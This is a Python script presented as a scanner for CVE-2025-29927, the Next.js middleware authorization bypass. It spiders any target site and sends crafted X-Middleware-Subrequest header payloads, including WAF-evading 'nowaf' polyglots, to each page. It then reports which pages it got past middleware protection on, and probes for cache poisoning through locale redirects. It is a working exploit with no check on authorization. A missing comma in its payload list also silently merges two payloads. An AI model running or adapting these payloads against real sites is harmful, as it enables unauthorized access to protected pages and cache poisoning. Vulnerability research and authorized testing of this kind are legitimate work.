"""
Next.js-CVE-2025-29927 Middleware Vulnerability Comprehensive Scanner

This script comprehensively checks Next.js applications for vulnerabilities related to CVE-2025-29927,
an authorization bypass via middleware manipulation.

Scanner Capabilities:
- Detects Next.js middleware usage through HTTP headers (x-middleware-rewrite, x-middleware-set-cookie).
- Identifies middleware-induced redirects explicitly (307 responses, x-nextjs-redirect, x-nextjs-rewrite).
- Utilizes advanced polyglot header techniques to test middleware bypass possibilities efficiently.
- Covers multiple known middleware paths used across different Next.js versions.
- Explicitly checks for potential cache poisoning and DoS scenarios via locale-based redirects.


Source Articles and References:
- Assetnote Comprehensive Analysis:
  https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/

- Next.js and the corrupt middleware: the authorizing artifact
  https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
    
- Understanding CVE-2025-29927:
  https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/

Dependencies:
- Install required Python packages using:
  pip install requests beautifulsoup4 urllib3 colorama

Usage:
- Run the script and input the URL of the Next.js application to scan:
  python nextjs_scanner.py

Contribute and Customize:
Feel free to modify, enhance, correct, or hack the script to better suit your needs or contribute improvements back to the community. 
Contributions are always welcome!

License:
This Python script is provided "as-is" without any warranties or
guarantees, express or implied. The author is not responsible for any
damage, loss of data, or other issues that may result from using this
script. Users are encouraged to review and test the code thoroughly
before using it in any critical or production environment. By using this
script, you acknowledge and agree that you are doing so at your own risk
and that the author bears no liability for any consequences arising from
its use or misuse.
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import urllib3
import time
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
visited = set()

headers_initial = {
    'X-Nextjs-Data': '1',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept': '*/*',
    'User-Agent': 'Mozilla/5.0 (compatible)',
    'Connection': 'close',
    'Cache-Control': 'max-age=0'
}

middleware_headers = [
    'pages/_middleware',
    'pages/admin/_middleware',
    'pages/admin/dashboard/_middleware',
    'middleware',
    'middleware:middleware:middleware:middleware:middleware',
    'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
    'src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware'
]

def print_separator():
    print(Fore.CYAN + '-' * 80)

def scan_nextjs(url):
    print_separator()
    print(Fore.BLUE + Style.BRIGHT + f"[SCANNING] {url}")

    try:
        response = requests.get(url, timeout=10, verify=False)
        headers = response.headers
        nextjs_present = 'x-powered-by' in headers and 'next.js' in headers.get('x-powered-by').lower()
        middleware_present = any(hdr in headers for hdr in ['x-middleware-rewrite', 'x-middleware-set-cookie'])

        if response.status_code == 200 and nextjs_present and middleware_present:
            detected = [hdr for hdr in ["x-middleware-rewrite", "x-middleware-set-cookie"] if hdr in headers]
            print(Fore.YELLOW + f'[INFO] Middleware detected at {url}. Headers: {detected}')

        initial_response = requests.get(url, headers=headers_initial, timeout=10, verify=False, allow_redirects=False)

        redirect_headers = ['x-nextjs-redirect', 'x-middleware-rewrite', 'x-nextjs-rewrite']
        if initial_response.status_code == 307 and any(hdr in initial_response.headers for hdr in redirect_headers):
            redirect_url = initial_response.headers.get('x-nextjs-redirect', '')
            if redirect_url.startswith(('/en/', '/es/', '/fr/', '/de/')):
                print(Fore.MAGENTA + f"[INFO] Locale-based redirect detected ({redirect_url}) at {url}, checking for cache poisoning.")

                exploit_response = requests.get(url, headers={'X-Nextjs-Data': '1', 'X-Middleware-Subrequest': 'middleware'}, timeout=10, verify=False, allow_redirects=False)
                if exploit_response.status_code == 200:
                    print(Fore.RED + f"[WARNING] Potential cache poisoning or DoS at {url} by bypassing locale redirect.")
                return

            detected_headers = [hdr for hdr in redirect_headers if hdr in initial_response.headers]
            print(Fore.YELLOW + f"[INFO] Middleware redirect detected at {url}. Headers: {detected_headers}")

            for middleware_path in middleware_headers:
                exploit_headers = {
                    'X-Nextjs-Data': '1',
                    'X-Middleware-Subrequest': middleware_path,
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept': '*/*',
                    'User-Agent': 'Mozilla/5.0 (compatible)',
                    'Connection': 'close',
                    'Cache-Control': 'max-age=0'
                }
                exploit_response = requests.get(url, headers=exploit_headers, timeout=10, verify=False, allow_redirects=False)

                if exploit_response.status_code == 200 and not any(hdr in exploit_response.headers for hdr in redirect_headers):
                    print(Fore.RED + Style.BRIGHT + f"[VULNERABLE] {url} middleware bypassed successfully using {middleware_path}.")
                    break
                elif exploit_response.status_code == 307:
                    print(Fore.GREEN + f"[SAFE] Middleware active at {url}, explicitly redirected using {middleware_path}. Response: 307")
                else:
                    print(Fore.GREEN + f"[SAFE] Middleware bypass unsuccessful at {url} using {middleware_path}. Response: {exploit_response.status_code}")
        else:
            print(Fore.GREEN + f"[INFO] No middleware redirect vulnerabilities detected at {url}.")

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[ERROR] Could not connect to {url}: {e}")

def spider(url, base_domain, max_depth=3, depth=0):
    if depth > max_depth or url in visited:
        return

    visited.add(url)
    scan_nextjs(url)

    try:
        response = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(response.content, "html.parser")

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            parsed_full_url = urlparse(full_url)

            if parsed_full_url.netloc == base_domain and full_url not in visited:
                time.sleep(0.5)
                spider(full_url, base_domain, max_depth, depth + 1)

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f'[ERROR] Failed to retrieve {url}:', e)

if __name__ == '__main__':
    target_url = input("Enter target URL (with or without https://): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    parsed_base_url = urlparse(target_url)
    base_domain = parsed_base_url.netloc

    spider(target_url, base_domain)
